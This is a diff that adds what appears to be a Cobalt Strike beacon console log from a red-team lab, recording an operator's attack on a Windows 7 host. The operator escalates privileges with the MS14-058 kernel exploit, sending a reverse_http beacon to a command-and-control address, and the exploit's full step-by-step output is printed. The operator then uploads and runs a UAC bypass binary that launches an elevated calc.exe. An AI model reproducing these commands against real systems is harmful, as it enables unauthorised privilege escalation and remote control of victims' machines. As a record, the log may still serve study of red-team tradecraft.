@@ -1,0 +1,36 @@
+02/26 11:10:44 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 5844; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/26 11:11:11 [input] <neo> elevate ms14-058 test
+02/26 11:11:11 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
+02/26 11:11:42 [checkin] host called home, sent: 104503 bytes
+02/26 11:11:43 [output]
+received output:
+[*] Getting Windows version...
+[*] Solving symbols...
+[*] Requesting Kernel loaded modules...
+[*] pZwQuerySystemInformation required length 43520
+[*] Parsing SYSTEM_INFO...
+[*] 147 Kernel modules found
+[*] Checking module \SystemRoot\system32\ntoskrnl.exe
+[*] Good! nt found as ntoskrnl.exe at 0x03c60000
+[*] ntoskrnl.exe loaded in userspace at: 40000000
+[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003FB31FC
+[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FB69D0
+[*] Registering class...
+[*] Creating window...
+[*] Allocating null page...
+[*] Getting PtiCurrent...
+[*] Good! dwThreadInfoPtr 0xFFFFF900C3A35C30
+[*] Creating a fake structure at NULL...
+[*] Triggering vulnerability...
+[!] Executing payload...
+
+
+02/26 11:15:07 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
+02/26 11:15:07 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 11:15:07 [task] cd c:\RedTeam\
+02/26 11:15:07 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+02/26 11:15:07 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+02/26 11:15:07 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 calc.exe
+02/26 11:15:43 [checkin] host called home, sent: 160366 bytes
+02/26 13:56:13 [input] <neo> exit
+02/26 13:56:13 [task] Tasked beacon to exit
